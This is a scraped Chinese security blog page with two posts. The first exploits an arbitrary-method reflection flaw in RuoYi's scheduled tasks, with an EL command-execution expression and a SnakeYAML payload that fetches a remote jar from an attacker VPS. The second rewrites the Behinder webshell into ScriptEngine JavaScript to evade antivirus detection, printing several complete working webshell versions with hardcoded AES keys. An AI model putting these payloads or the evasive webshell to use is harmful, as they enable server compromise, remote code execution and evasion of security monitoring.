            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-07-21 09:08:05" itemprop="dateCreated datePublished" datetime="2021-07-21T09:08:05+08:00">2021-07-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-09-28 19:12:52" itemprop="dateModified" datetime="2021-09-28T19:12:52+08:00">2021-09-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞利用</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        某次团队的小伙伴给了个系统需要后台getshell，经过分析这个系统不解析jsp，但在后台发现了个反射调用任意类的任意方法的功能点，想到通过JNDI注入利用，下面着重分析如何通过JNDI注入种植内存马。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​        该漏洞点主要在<code>com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod(com.ruoyi.quartz.domain.SysJob)</code>方法中，当传入的对象是bean,则会调用bean的方法，当传入的不是bean则创建类的实例并调用对应的方法。</p>
<p>e</p>
<p>​        在<code>com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod(java.lang.Object, java.lang.String, java.util.List&lt;java.lang.Object[]&gt;)</code>中完成反射调用。</p>
<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721094459758.png" alt="image-20210721094459758"></p>
<p>​        这是一个计划任务的功能，调用目标的类参数和方法均为用户可控，所以我们可以调用任意类的非private方法。</p>
<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721094553756.png" alt="image-20210721094553756"></p>
<h3 id="EL表达式利用"><a href="#EL表达式利用" class="headerlink" title="EL表达式利用"></a>EL表达式利用</h3><p>​        由于这套系统依赖了tomcat环境，而tomcat自身支持el表达式，可以通过执行EL表达式进行利用。</p>
<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721095432250.png" alt="image-20210721095432250"></p>
<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721095453215.png" alt="image-20210721095453215"></p>
<p>​        下面只要构造好EL表达式执行命令完成利用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELProcessor()).eval(<span class="string">"\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"calc\").toString()"</span>);</span><br></pre></td></tr></table></figure>

<p>​        但是这种利用方式却出现了问题，主要是该系统对参数提取的部分导致的，在通过<code>com.ruoyi.quartz.util.JobInvokeUtil#getMethodParams</code>处理参数时，会将（）中间的内容提取当作参数，但是我们传入的参数本身就带有（）,因此只会解析到getClass(，后面传入的参数会被截断，因此无法直接通过这种方式进行利用。</p>
<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721100749379.png" alt="image-20210721100749379"></p>
<h3 id="snakeyaml反序列化利用"><a href="#snakeyaml反序列化利用" class="headerlink" title="snakeyaml反序列化利用"></a>snakeyaml反序列化利用</h3><p>​        这套程序使用了yml作为配置文件，而解析yml一般会使用snakeyaml库，当使用Yaml.load加载内容时，会进行反序列化操操作，将<code>!!全路径类名</code>转换为对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Yaml.load(<span class="string">'!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://vps-ip:port/yaml-payload.jar"]]]]'</span>)</span><br></pre></td></tr></table></figure>

<p>​        这里讲下为什么要加上ScriptEngineManager，我们知道当我们通过<code>URLClassLoader loader = new URLClassLoader (new URL[] {u});</code>创建URLClassLoader时是不会直接去加载远程的jar的，只有当通过<code>Class.forName (&quot;Hello&quot;, true, loader);</code>时才会加载远程的Class。在ScriptEngineManager中存在构造方法并接收ClassLoader对象，并且会调用Class.forName触发类加载，所以这里才需要加上ScriptEngineManager。</p>
<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721150351379.png" alt="image-20210721150351379"></p>
<p>​        虽然上面的代码通过<code>Class.forName</code>触发了类加载，但是要执行我们的恶意类还取决于<code>nextName</code>的值，在<code>java.util.ServiceLoader.LazyIterator#hasNextService</code>中将pending的内容赋值给了netxtName。</p>
<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721175458375.png" alt="image-20210721175458375"></p>
<p>​        这里我们了解下ServiceLoader类，这个类是SPI的具体实现。在ServiceLoader.load的时候，根据传入的接口类，遍历<code>META-INF/services</code>目录下的以该类命名的文件中的所有类，并实例化返回。</p>
<p>​        再回到代码里，我们这里传入了URLClassLoader，调用URLClassLoader.getResources会加载远程jar包的文件，再parse中读取远程<code>META-INF/services/javax.script.ScriptEngineFactory</code>中的内容并返回，所以我们的jar包中要在文件下放置我们想要获取Class实例的类名。</p>
<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721180503290.png" alt="image-20210721180503290"></p>
<p>​        最后提的一点是在通过Class.forName得到Class对象后，后面还会使用newInstance方法创建对象，所以我们可以把恶意代码写到构造方法中。并且通过cast将类型转换为<code>javax.script.ScriptEngineFactory</code>，所以要想执行过程中不报错，需要实现ScriptEngineFactory接口。</p>
<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721202406778.png" alt="image-20210721202406778"></p>
<p>​        这里需要注意编译jar的jdk版本要和目标jdk版本大致一致，我使用jdk6编译jar，在jdk8环境下运行系统加载类时会导致异常不能加载。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/" class="post-title-link" itemprop="url">冰蝎客户端改写</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-06-18 15:22:24" itemprop="dateCreated datePublished" datetime="2021-06-18T15:22:24+08:00">2021-06-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-06-22 15:48:46" itemprop="dateModified" datetime="2021-06-22T15:48:46+08:00">2021-06-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index">
                    <span itemprop="name">免杀</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​             漏洞利用后一般需要拿shell，如果shell不免杀可能容易触发目标的防护，甚至去溯源捕获我们的0day，所以做一个免杀的shell是有必要的，今天刚好看到<code>一种新型Java一句话木马的实现</code>文章，可以通过ScriptEngine来执行我们的代码，由于这种方式执行代码的语法和之前jsp马的实现有些不同，所以可以通过这种方式改写shell来实现免杀。</p>
<p>​        在要通过ScriptEngine改写shell之前，首先我们要了解冰蝎shell做了什么？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;</span><br><span class="line">    &lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;  <span class="comment">//定义类U并继承ClassLoader</span></span><br><span class="line">	U(ClassLoader c)&#123;</span><br><span class="line">		<span class="keyword">super</span>(c) <span class="comment">// 构造方法，执行父类ClassLoader的构造方法</span></span><br><span class="line">		;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;  <span class="comment">//执行defineClass方法</span></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;</span><br><span class="line">		&#125;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">"POST"</span>))&#123; <span class="comment">//判断请求类型</span></span><br><span class="line">String k=<span class="string">"e45e329feb5d925b"</span>;</span><br><span class="line">session.putValue(<span class="string">"u"</span>,k); <span class="comment">//将key写入到session</span></span><br><span class="line">Cipher c=Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">"AES"</span>)); <span class="comment">//初始化AES解码器</span></span><br><span class="line"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(</span><br><span class="line">c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())) <span class="comment">//将接收的内容base64解码后进行aes解密</span></span><br><span class="line">) <span class="comment">//创建ClassLoader对象，并调用ClassLoader.defineClass方法将接收的字节码转换为class类。</span></span><br><span class="line">    .newInstance().equals(pageContext);&#125;%&gt; <span class="comment">//创建该类对象并调用该对象的equals方法</span></span><br></pre></td></tr></table></figure>

<p>​        下面了解下如何通过ScriptEngine执行JS代码,DEMO如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ScriptEngine engine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"javascript"</span>);</span><br><span class="line">String test666=<span class="string">"print(2+2)"</span>;</span><br><span class="line">engine.eval(test666);</span><br></pre></td></tr></table></figure>

<p>​        下面实现Import的功能,由于JDK8使用importPackage需要通过load进行导入mozilla_compat.js，但JDK7则没有load函数，所以使用下面的语句import在JDK7下运行会报错。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ScriptEngine engine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"javascript"</span>);</span><br><span class="line"> String test666=<span class="string">"load(\"nashorn:mozilla_compat.js\");importPackage(\"java.util.*,javax.crypto.*,javax.crypto.spec.*\")"</span>;</span><br><span class="line"> engine.eval(test666);</span><br></pre></td></tr></table></figure>

<p>​        可以在load语句处加上异常处理，那么无论load执行是否成功都不会影响后续程序的执行,所以导入数据包的代码如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">"nashorn:mozilla_compat.js"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br></pre></td></tr></table></figure>

<p>​        按照冰蝎shell的代码，接下来要定义一个类并实现ClassLoader,但是查了下ScriptEngine的文档，好像没有定义类的操作,但我们仔细想想，其实也不是非要定义一个类不可，只不过是想调用defineClass加载我们传入的类的字节码，所以我们可以直接通过反射调用defineClass方法。下面代码参考<code>一种新型Java一句话木马的实现</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> byteArray = Java.type(<span class="string">"byte[]"</span>);</span><br><span class="line">  <span class="keyword">var</span> int = Java.type(<span class="string">"int"</span>);</span><br><span class="line">  <span class="keyword">var</span> defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">    <span class="string">"defineClass"</span>,</span><br><span class="line">    byteArray.class,</span><br><span class="line">    int.class,</span><br><span class="line">    int.class</span><br><span class="line">  );</span><br><span class="line">  defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> cc = defineClassMethod.invoke(</span><br><span class="line">    Thread.currentThread().getContextClassLoader(),</span><br><span class="line">    classBytes,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    classBytes.length</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> cc.getConstructor().newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​            由于冰蝎客户端需要一些对象，所以在创建ScriptEngine后需要绑定对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ScriptEngine engine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"js"</span>);</span><br><span class="line">engine.put(<span class="string">"request"</span>, request);</span><br><span class="line">engine.put(<span class="string">"response"</span>, response);</span><br><span class="line">engine.put(<span class="string">"session"</span>, session);</span><br><span class="line">engine.put(<span class="string">"pageContext"</span>, pageContext);</span><br></pre></td></tr></table></figure>

<p>​            剩下的似乎没有什么难点，我直接给出我改写后的内容</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">"nashorn:mozilla_compat.js"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> byteArray = Java.type(<span class="string">"byte[]"</span>);</span><br><span class="line">  <span class="keyword">var</span> int = Java.type(<span class="string">"int"</span>);</span><br><span class="line">  <span class="keyword">var</span> defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">    <span class="string">"defineClass"</span>,</span><br><span class="line">    byteArray.class,</span><br><span class="line">    int.class,</span><br><span class="line">    int.class</span><br><span class="line">  );</span><br><span class="line">  defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> cc = defineClassMethod.invoke(</span><br><span class="line">    Thread.currentThread().getContextClassLoader(),</span><br><span class="line">    classBytes,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    classBytes.length</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> cc.getConstructor().newInstance().equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">"POST"</span>))&#123;</span><br><span class="line">      <span class="keyword">var</span> k=<span class="string">"39236cce7e199d43"</span>;</span><br><span class="line">      session.putValue(<span class="string">"u"</span>,k);</span><br><span class="line">      <span class="keyword">var</span> c=Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">      c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">"AES"</span>));</span><br><span class="line">      define(c.doFinal(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(request.getReader().readLine())))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在使用的时候遇到了一个BUG，第一次请求正常，第二次请求会爆类重复加载的异常。</p>
<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210619171644662.png" alt="image-20210619171644662"></p>
<p>​        经过排错，当通过反射调用时，每次调用defineClass使用的是WebAppClassLoader，这个Loader对于每个web应用是唯一的，下一次再去请求defineClass就会导致重复加载。</p>
<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210621164620593.png" alt="image-20210621164620593"></p>
<p>​        而使用冰蝎自带的马去请求，每次请求都会创建一个新的classloader,所以不会出现重复加载类的异常。</p>
<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210621164844859.png" alt="image-20210621164844859"></p>
<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210621165042946.png" alt="image-20210621165042946"></p>
<p>​                所以现在实现思路为在JSP中首先使用JAVA代码创建一个继承了ClassLoader的类，创建一个该类的对象，并将对象进行绑定，在JS中调用该对象定义的方法，下面是我在jdk8的实现。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">"nashorn:mozilla_compat.js"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> defineClassMethod =test2.getClass().getDeclaredMethod(</span><br><span class="line">    <span class="string">"g"</span>,</span><br><span class="line">    classBytes.getClass()</span><br><span class="line">  );</span><br><span class="line">defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">var</span> cc = defineClassMethod.invoke(</span><br><span class="line">    test2,</span><br><span class="line">    classBytes</span><br><span class="line">  );</span><br><span class="line">  cc.newInstance().equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">"POST"</span>))&#123;</span><br><span class="line">      <span class="keyword">var</span> k=<span class="string">"39236cce7e199d43"</span>;</span><br><span class="line">      session.putValue(<span class="string">"u"</span>,k);</span><br><span class="line">      <span class="keyword">var</span> c=Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">      c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">"AES"</span>));</span><br><span class="line">      define(c.doFinal(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(request.getReader().readLine())))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        但在JDK6和7使用的解析引擎和JDK8是不同的，上面的代码不能使用，经过兼容性的修改，实现如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">"nashorn:mozilla_compat.js"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> defineClassMethod =test2.getClass().getDeclaredMethod(<span class="string">"g"</span>,classBytes.getClass());</span><br><span class="line">  defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> cc=defineClassMethod.invoke(test2,classBytes);</span><br><span class="line">  cc.newInstance().equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">"POST"</span>))&#123;</span><br><span class="line">      <span class="keyword">var</span> k=<span class="keyword">new</span> java.lang.String(<span class="string">"39236cce7e199d43"</span>);</span><br><span class="line">      session.putValue(<span class="string">"u"</span>,k);</span><br><span class="line">      <span class="keyword">var</span> c=Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">      c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">"AES"</span>));</span><br><span class="line">      define(c.doFinal(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(request.getReader().readLine())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        但这样实现会在invoke是爆一个类型转换异常。</p>
<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210622141931784.png" alt="image-20210622141931784"></p>
<p>​        经过排错，问题主要在<code>sun.org.mozilla.javascript.internal.NativeJavaMethod#call</code>函数中 ，这里会将我们反射方法需要的参数转换为Object[]，但实际上我们传入的是byte[]，byte[]显然不能转为Object[]。</p>
<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210622142124037.png" alt="image-20210622142124037"></p>
<p>​        又经过复杂的排错，发现是JS类型和JAVA的类型转换出现了错误，将classBytes通过<code>new Array()</code>转换一下就可以了，下面的代码兼容JDK7\8</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">"nashorn:mozilla_compat.js"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> defineClassMethod =test2.getClass().getDeclaredMethod(<span class="string">"g"</span>,classBytes.getClass());</span><br><span class="line">  print(defineClassMethod)</span><br><span class="line">  defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> cc=defineClassMethod.invoke(test2,<span class="keyword">new</span> <span class="built_in">Array</span>(classBytes));</span><br><span class="line"></span><br><span class="line">  cc.newInstance().equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">"POST"</span>))&#123;</span><br><span class="line">      <span class="keyword">var</span> k=<span class="keyword">new</span> java.lang.String(<span class="string">"39236cce7e199d43"</span>);</span><br><span class="line">      session.putValue(<span class="string">"u"</span>,k);</span><br><span class="line">      <span class="keyword">var</span> c=Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">      c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">"AES"</span>));</span><br><span class="line">      define(c.doFinal(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(request.getReader().readLine())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        最后看下免杀效果。</p>
<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210622153106003.png" alt="image-20210622153106003"></p>
<p><strong>总结</strong></p>
